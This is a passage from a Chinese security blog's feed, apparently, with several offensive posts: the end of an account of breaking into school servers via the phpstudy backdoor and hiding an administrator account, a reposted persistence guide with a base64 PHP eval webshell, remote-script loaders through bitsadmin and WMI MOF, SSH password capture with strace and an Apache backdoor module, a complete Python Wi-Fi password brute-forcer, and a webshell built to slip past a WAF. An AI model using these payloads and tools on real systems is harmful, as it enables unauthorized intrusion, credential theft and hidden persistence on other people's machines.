start="2"><li>接下来操作注册表，使这个账户在图形界面中也不显示</li></ol><ul><li>输入 regedit 打开注册表编辑器，找到 HKEY_LOCAL_MACHINE\SAM\SAM,右键点击权限，将读写权限赋予 administrator</li></ul><p><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/9.webp" alt></p><ul><li>找到后门用户和 administrator 用户对应的目录</li></ul><p><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/10.webp" alt></p><ul><li>将 administrator 对应目录中的F值复制到后门用户对应目录中的F值<br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/11.webp" alt></li><li><p>复制完成后，把 defaultuser0$ 和其对应的 0000003EA 目录导出并保存，然后删除刚才的后门用户</p><p>  net user defaultuser0$ /del</p></li></ul><p>然后重新导入注册表，这样就添加了一个隐藏的用户，使用 defaultuser0$ 和密码就能登陆为 administrator<br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/12.webp" alt><br>事后，发现登着 tim 呢，找到 qq 号，进行亲切友好的交谈<br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/13.webp" alt><br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/14.webp" alt></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>本文转自合天智汇，如有侵权请联系作者，立即删除。<br>原文链接：<a href="https://mp.weixin.qq.com/s/97I6jIvKzjHxmTboSyd86A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/97I6jIvKzjHxmTboSyd86A</a></p><p><strong>声明：作者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间 phpstudy 被爆出存在后门，想到学校里的许多站都是用 phpstudy 做的环境，于是写了个脚本扫描了下，发现真的有中招的。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://black0saturday.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透中的后门利用</title>
    <link href="http://black0saturday.github.io/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"/>
    <id>http://black0saturday.github.io/2020/04/17/渗透中的后门利用/</id>
    <published>2020-04-17T06:03:30.000Z</published>
    <updated>2020-04-20T07:04:18.725Z</updated>
    
    <content type="html"><![CDATA[<p>本文转自<strong>中国白客联盟</strong>，如有侵权请联系作者，马上删除</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要介绍权限维持，介绍如何在有一定权限的情况下，留下后门。当然各类后门太多太多了，这里主要列举一些常用的、方便的。</p><hr><a id="more"></a><h2 id="WEB类"><a href="#WEB类" class="headerlink" title="WEB类"></a>WEB类</h2><p>本类主要介绍基于web类的一些后门，比如大家熟知的webshell。</p><h3 id="php站点"><a href="#php站点" class="headerlink" title="php站点"></a>php站点</h3><ol><li><strong>.user.ini</strong><br>当我们服务器是以fastcgi运行的php，我们就可以使用该方法进行后门操作。</li></ol><p>当我们配置.user.ini时，在该文件中插入auto_prepend_file=evil.txt 时，就可以做到访问当前目录下的所有php文件时，就自动包含这个evil.txt：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/1.png" alt></p><ol start="2"><li><p><strong>.htaccess</strong><br>站长经常用.htaccess做伪静态，我们也可以拿来做后门。<br>自定义.htaccess上传，下面是内容</p><p> <FileMatch "aaa"><br> SetHandler application/x-httpd-php<br> </FileMatch><br>同目录下，上传一个名称包含aaa的文件，就可以把此文件当成php解析。</p></li><li><p><strong>php.ini</strong><br>修改php.ini，添加如下内容：</p><p> allow_url_include=On<br> auto_prepend_file=”data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+”<br>重启php后，访问任意php页面都可以自动包含上述webshell，即解码后的</p><p> &lt;?php @eval($_REQUEST[cmd]);?&gt;</p></li></ol><p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/2.png" alt></p><ol start="4"><li><p><strong>pher</strong><br>php有个环境变量：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/3.png" alt><br>默认该目录不存在，创建即可，然后在该目录下放置一个webshell，然后在web目录写个包含该webshell的代码即可：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/4.png" alt><br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/5.png" alt></p></li><li><p><strong>asp（x）站点</strong><br>bin目录下存放的dll主要是作为aspx文件拿来映射的，可以理解为访问aspx文件时，可以调用bin目录下的dll里面的类。而web.config又可以控制映射逻辑。</p></li></ol><ul><li>aspxceshi目录存放一个webshell，如jumbo.aspx</li><li>执行如下命令：<br>  C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_compiler.exe -v / -p c:\Users\Jumbo\Desktop\aspxceshi\webshell\ c:\Users\Jumbo\Desktop\aspxceshi\webshellbin\</li><li>就会在webshellbin目录生成dll文件：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/6.png" alt><br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/7.png" alt></li><li>复制compilde文件里面的assembly值和 type值</li><li><p>修改网站根目录的web.config，添加如下代码：</p><p>  &lt;system.web&gt;</p><pre><code>  &lt;httpHandlers&gt;      &lt;add verb=&quot;*&quot; path=&quot;*&quot; type=&quot;assembly值, type值&quot; validate=&quot;True&quot;/&gt;  &lt;/httpHandlers&gt;&lt;/system.web&gt;</code></pre></li><li><p>把生成的dll放到网站bin目录</p></li><li>访问任意地址都是webshell</li></ul><p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/8.png" alt></p><ol start="5"><li><strong>jsp(x)站点</strong><br>具体详情可以找陆军长。<br>这里涉及版权问题，不提供思路和代码，直接看效果：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/8.png" alt></li></ol><h3 id="系统类"><a href="#系统类" class="headerlink" title="系统类"></a>系统类</h3><p>主要介绍基于系统类的一些后门，比如大家熟知的启动项之类</p><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><p>在windows中，可以添加例如如下注册表：</p><pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></pre><p>即可让机器重启后自动加载你的payload。</p><h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><p>bitsadmin也可以做启动项：<br>    bitsadmin /create backdoor<br>    bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe<br>    bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe “/u /s /i:<a href="https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct</a> scrobj.dll”<br>    bitsadmin /Resume backdoor</p><h3 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h3><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)   instance of __EventFilter as $EventFilter{  EventNamespace = &quot;Root\\Cimv2&quot;;    Name  = &quot;filtP1&quot;;    Query = &quot;Select * From __InstanceModificationEvent &quot;            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;            &quot;And TargetInstance.Second = 1&quot;;    QueryLanguage = &quot;WQL&quot;;};   instance of ActiveScriptEventConsumer as $Consumer{    Name = &quot;consP1&quot;;    ScriptingEngine = &quot;JScript&quot;;    ScriptText = &quot;GetObject(\&quot;script:http://172.16.127.1:2333/aaaa\&quot;)&quot;;};   instance of __FilterToConsumerBinding{    Consumer   = $Consumer;    Filter = $EventFilter;};mofcomp 1.mof</code></pre><h3 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h3><p>com劫持、签名伪造、wmi、镜像劫持、netsh后门、Office。太多太多了，就不一一展开讲了。</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><p>这里可以利用alias别名记录root密码：</p><pre><code>https://mp.weixin.qq.com/s?__biz=MzA4NjQxMDcxNA==&amp;mid=2709352583&amp;idx=1&amp;sn=5d1fd02840f0c070036f9c0e70b23958</code></pre><h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><p>利用strace抓ssh密码</p><pre><code>strace -f -p sshdpid-o sshd.out.txt -v -e trace=read,write -s 128</code></pre><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>在linux中，我们可以利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。<br>我们可以通过修改动态链接库为我们恶意的so文件时，即可劫持相关函数。<br>就以常用的劫持getuid()为例。<br>man 2 getuid 查看函数原型：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/9.png" alt><br>编写恶意劫持getuid的c文件：</p><p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/10.png" alt><br>编译成so文件：<br>    gcc -shared -fPIC evil.c -o evil.so<br>为了测试，临时加载环境变量，发现成功劫持：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/11.png" alt></p><h3 id="杂-1"><a href="#杂-1" class="headerlink" title="杂"></a>杂</h3><p>openssh后门、rootkit。太多太多了，就不一一展开讲了。</p><h3 id="容器类"><a href="#容器类" class="headerlink" title="容器类"></a>容器类</h3><ol><li>iis<br>iis中可以添加ISAPI来达到后门的效果，这里以micropoor_iis为例，请求任意地址，配置ip端口即可反弹：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/12.png" alt></li><li><p>apache<br>apache中可以利用apxs生成一个扩展，然后编写相关利用payload。<br>主要是遍历header头，如果带有Backdoor，则执行命令：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/13.png" alt><br>编译、安装、启动，-a命令会自动并在httpd.conf添加loadmodule命令（LoadModule backdoor_module    /usr/lib64/httpd/modules/mod_backdoor.so）：</p><p> apxs -i -a -c mod_backdoor.c &amp;&amp; service apache2 restart</p></li></ol><p>现在请求任何页面，只要带上Backdoor头即可执行命令：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/14.png" alt></p><h3 id="扩展类"><a href="#扩展类" class="headerlink" title="扩展类"></a>扩展类</h3><p>我们可以在php.ini中加载恶意的扩展，达到访问任意php页面都可以执行payload的目的。<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/15.png" alt></p><h3 id="软件类"><a href="#软件类" class="headerlink" title="软件类"></a>软件类</h3><p>当一个exe运行加载dll时，他的顺序是：</p><pre><code>a. 应用程序所在目录；b. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32；c. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；d. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows；e. 当前目录。GetCurrentDirectory返回的目录；f. 环境变量PATH中所有目录。</code></pre><p>因此我们可以使用如ProcessMonitor工具查看某个exe软件运行时会调用哪些dll，并且这个dll不在<br>    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs<br>注册表中，可以尝试进行dll劫持。</p><h3 id="日志类"><a href="#日志类" class="headerlink" title="日志类"></a>日志类</h3><p>我们正常来访问一个文件，我们看到的是这么一条200的日志：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/16.png" alt><br>那如果我们加个header头呢？在日志里面看到的就是一条404的日志：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/17.png" alt><br>但是这样就算日志看起来是404，如果人家访问一下，直接能看到结果，可能还是不太好，那就再加个user-agent的判断：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/18.png" alt></p><h3 id="流量层面"><a href="#流量层面" class="headerlink" title="流量层面"></a>流量层面</h3><p>这里我以蚁剑为例。<br>我先介绍下整个加密的流程：</p><pre><code>1、本地发送加密的数据包2、webshell解密执行命令3、返回数据包加密4、本地解密</code></pre><p>先根据蚁剑实例写个发送包时候的aes加密，即编码器：</p><p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/19.png" alt><br>我们选择新增的编码器后，随便往某个页面post数据，抓个包，看到我们的数据包已然是加密状态：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/20.png" alt><br>用在线的aes解密网站，然后用我们的定义的key发现也能成功解密：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/21.png" alt><br>这时候我们就到达第二步，在webshell里面做解密执行：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/22.png" alt><br>这时候连接我们的指定webshell，即可成功连接：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/23.png" alt><br>现在就需要把数据包加密返回并解密显示，也就是解码器。</p><p>首先创建一个加密方法：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/24.png" alt><br>这样在数据包中客户端就会调用这个加密方法加密服务端返回的数据，我们可以把请求包解密看到详情：<br><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/25.png" alt><br>现在服务端返回给我们的数据包就是加密的，然后本地再解密即可：</p><p><img src="/2020/04/17/%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/26.png" alt></p><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>原文链接：<a href="https://mp.weixin.qq.com/s/EfzSC979qQqXxXLZsV9LpA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/EfzSC979qQqXxXLZsV9LpA</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文转自&lt;strong&gt;中国白客联盟&lt;/strong&gt;，如有侵权请联系作者，马上删除&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文主要介绍权限维持，介绍如何在有一定权限的情况下，留下后门。当然各类后门太多太多了，这里主要列举一些常用的、方便的。&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://black0saturday.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>kali2020-amd64-virtualbox</title>
    <link href="http://black0saturday.github.io/2020/04/16/kali2020-amd64-virtualbox/"/>
    <id>http://black0saturday.github.io/2020/04/16/kali2020-amd64-virtualbox/</id>
    <published>2020-04-16T07:45:07.000Z</published>
    <updated>2020-04-17T00:37:44.063Z</updated>
    
    <content type="html"><![CDATA[<p>Kali2020用Virtual Box安装好的OVA文件（把文件导入Virtual Box可直接使用）<br><a id="more"></a></p><p>内容包括：</p><ol><li>中科大源，并且已更新过</li><li>中文输入法</li><li>时区已设为上海，同步标准时间</li></ol><pre><code>链接：https://pan.baidu.com/s/1vTxkA-9kv_nCTPTNwYN8Xw 提取码：z9uq</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Kali2020用Virtual Box安装好的OVA文件（把文件导入Virtual Box可直接使用）&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>python脚本破解wifi密码</title>
    <link href="http://black0saturday.github.io/2020/04/15/python%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/"/>
    <id>http://black0saturday.github.io/2020/04/15/python脚本破解wifi密码/</id>
    <published>2020-04-15T04:56:19.000Z</published>
    <updated>2020-04-16T07:07:19.934Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Python丰富的第三方库中自然也包括wifi的API，可以很方便的实现wifi的连接。如果有一份详细的密码本，可以实现wifi密码的暴力破解，前提是你有足够的耐心和时间去等待。</p><a id="more"></a><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>对给定的wifi名称，我们循环使用密码去一一做尝试，如果失败就断开连接，直到连接成功为止。</p><p>即导入所需要的第三方库（请自行下载安装好），通过 pywifi 调用网卡接口，依次做测试，循环读取密码尝试连接。在这里只需要修改密码文件路径和wifi名称即可。</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><blockquote><p>python3.8<br><br>模块： pywifi<br><br>wifi密码字典<br></p></blockquote><h1 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h1><pre><code>from pywifi import *</code></pre><h1 id="字典准备"><a href="#字典准备" class="headerlink" title="字典准备"></a>字典准备</h1><p>随机搞的wifi弱口令TOP10。一行只包含一组密码，脚本依次读取每行密码，直到找到正确的密码为止。</p><p><img src="/2020/04/15/python%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/1.png" alt></p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre><code>from tkinter import *from tkinter import ttkimport pywififrom pywifi import constimport timeimport tkinter.filedialogimport tkinter.messageboxclass MY_GUI():    def __init__(self, init_window_name):        self.init_window_name = init_window_name        # 密码文件路径        self.get_value = StringVar()        # 获取破解wifi账号        self.get_wifi_value = StringVar()        # 获取wifi密码        self.get_wifimm_value = StringVar()        self.wifi = pywifi.PyWiFi()  # 抓取网卡接口        self.iface = self.wifi.interfaces()[0]   # 抓取第一个无线网卡        self.iface.disconnect()  # 测试链接断开所有链接        time.sleep(1)  # 休眠1秒        # 测试网卡是否属于断开状态        assert self.iface.status() in\               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]    def __str__(self):        return &apos;(WIFI:%s,%s)&apos; % (self.wifi, self.iface.name())    # 设置窗口    def set_init_window(self):        self.init_window_name.title(&quot;WIFI破解工具&quot;)        self.init_window_name.geometry(&apos;+500+200&apos;)        labelframe = LabelFrame(width=400, height=200, text=&quot;配置&quot;)        labelframe.grid(column=0, row=0, padx=10, pady=10)        self.search = Button(labelframe, text=&quot;搜索附近WiFi&quot;, command=self.scans_wifi_list).grid(column=0, row=0)        self.pojie = Button(labelframe, text=&quot;开始破解&quot;, command=self.readPassWord).grid(column=1, row=0)        self.label = Label(labelframe, text=&quot;目录路径：&quot;).grid(column=0, row=1)        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)        self.file = Button(labelframe, text=&quot;添加密码文件目录&quot;, command=self.add_mm_file).grid(column=2, row=1)        self.wifi_text = Label(labelframe, text=&quot;WiFi账号：&quot;).grid(column=0, row=2)        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)        self.wifi_mm_text = Label(labelframe, text=&quot;WiFi密码：&quot;).grid(column=2, row=2)        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2, sticky=W)        self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)        # 定义树形结构与滚动条        self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show=&quot;headings&quot;,columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)        self.wifi_tree.configure(yscrollcommand=self.vbar.set)        # 表格的标题        self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)        self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)        self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)        self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)        self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)        self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)        self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)        self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)        self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;, self.onDBClick)        self.vbar.grid(row=4, column=1, sticky=NS)    # 搜索wifi    def scans_wifi_list(self):  # 扫描周围wifi列表        # 开始扫描        print(&quot;^_^ 开始扫描附近wifi...&quot;)        self.iface.scan()        time.sleep(15)        # 在若干秒后获取扫描结果        scanres = self.iface.scan_results()        # 统计附近被发现的热点数量        nums = len(scanres)        print(&quot;数量: %s&quot;% (nums))        # 实际数据        self.show_scans_wifi_list(scanres)        return scanres    # 显示wifi列表    def show_scans_wifi_list(self,scans_res):        for index,wifi_info in enumerate(scans_res):            self.wifi_tree.insert(&quot;&quot;, &apos;end&apos;, values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))    # 添加密码文件目录    def add_mm_file(self):        self.filename = tkinter.filedialog.askopenfilename()        self.get_value.set(self.filename)    # Treeview绑定事件    def onDBClick(self, event):        self.sels= event.widget.selection()        self.get_wifi_value.set(self.wifi_tree.item(self.sels, &quot;values&quot;)[1])    # 读取密码字典，进行匹配    def readPassWord(self):        self.getFilePath = self.get_value.get()        self.get_wifissid = self.get_wifi_value.get()        self.pwdfilehander=open(self.getFilePath, &quot;r&quot;, errors=&quot;ignore&quot;)        while True:            try:                self.pwdStr =self.pwdfilehander.readline()                if not self.pwdStr:                    break                self.bool1=self.connect(self.pwdStr, self.get_wifissid)                if self.bool1:                    self.res = &quot;===正确===  wifi名:%s  匹配密码：%s &quot; % (self.get_wifissid, self.pwdStr)                    self.get_wifimm_value.set(self.pwdStr)                    tkinter.messagebox.showinfo(&apos;提示&apos;, &apos;破解成功！！！&apos;)                    print(self.res)                    break                else:                    self.res = &quot;---错误--- wifi名:%s匹配密码：%s&quot; % (self.get_wifissid, self.pwdStr)                    print(self.res)                    sleep(3)            except:                continue    # 对wifi和密码进行匹配    def connect(self, pwd_Str, wifi_ssid):        # 创建wifi链接文件        self.profile = pywifi.Profile()        self.profile.ssid = wifi_ssid  # wifi名称        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法        self.profile.cipher = const.CIPHER_TYPE_CCMP    # 加密单元        self.profile.key = pwd_Str  # 密码        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件        self.iface.connect(self.tmp_profile)  # 链接        time.sleep(5)        if self.iface.status() == const.IFACE_CONNECTED:   # 判断是否连接上            isOK=True        else:            isOK=False        self.iface.disconnect()  # 断开        time.sleep(1)        # 检查断开状态        assert self.iface.status() in\            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]        return isOKdef gui_start():    init_window = Tk()    ui = MY_GUI(init_window)    print(ui)    ui.set_init_window()    init_window.mainloop()gui_start()</code></pre><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>运行结果如下图所示，你按照图形界面的操作，便能开始跑起来了。<br><img src="/2020/04/15/python%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Python丰富的第三方库中自然也包括wifi的API，可以很方便的实现wifi的连接。如果有一份详细的密码本，可以实现wifi密码的暴力破解，前提是你有足够的耐心和时间去等待。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://black0saturday.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>过狗一句话编写</title>
    <link href="http://black0saturday.github.io/2020/04/13/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99/"/>
    <id>http://black0saturday.github.io/2020/04/13/过狗一句话编写/</id>
    <published>2020-04-13T04:12:54.000Z</published>
    <updated>2020-04-14T04:51:09.589Z</updated>
    
    <content type="html"><![CDATA[<p>安全狗查杀一句话的时候，通常检测eval 和 $_POST[x]有没有同时出现，正常的POST数据不拦截，然后我们将POST来的数据放到存在代码执行漏洞的函数中，这样，POST来的数据就被执行了。<br><a id="more"></a></p><p>因此就想着试一试.选择的函数是create_function函数，create_function函数接收两个参数$args 和 $code 然后组成新函数function_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行了。</p><h3 id="构造-code"><a href="#构造-code" class="headerlink" title="构造$code"></a>构造$code</h3><p>$code = “n;}$_POST[x];/*”;</p><p>解释一下构造的$code:</p><ul><li>双引号中$_POST[x]被执行(这里以提交x=phpinfo();为例)</li><li>;来结束语句</li><li>}来结束函数体</li></ul><p>phpinfo();;就在函数体外面被eval执行了</p><p>/*注释多余的代码</p><p>最终代码：<code>eval(function_lambda_func($args){n;}phpinfo();;/*})</code></p><p>那么phpinfo()就被执行了.</p><p>如图：<br><img src="/2020/04/13/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99/1.png" alt><br>过狗测试：<br><img src="/2020/04/13/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99/2.png" alt></p><p>最终代码：</p><pre><code>&lt;?php     $args = &quot;tony&quot;;    $code = &quot;n;}$_POST[x];/*&quot;;    echo create_function(&apos;$args&apos;,$code);?&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;安全狗查杀一句话的时候，通常检测eval 和 $_POST[x]有没有同时出现，正常的POST数据不拦截，然后我们将POST来的数据放到存在代码执行漏洞的函数中，这样，POST来的数据就被执行了。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>构造优质上传漏洞Fuzz字典</title>
    <link href="http://black0saturday.github.io/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/"/>
    <id>http://black0saturday.github.io/2020/04/11/构造优质上传漏洞Fuzz字典/</id>
    <published>2020-04-11T02:32:34.000Z</published>
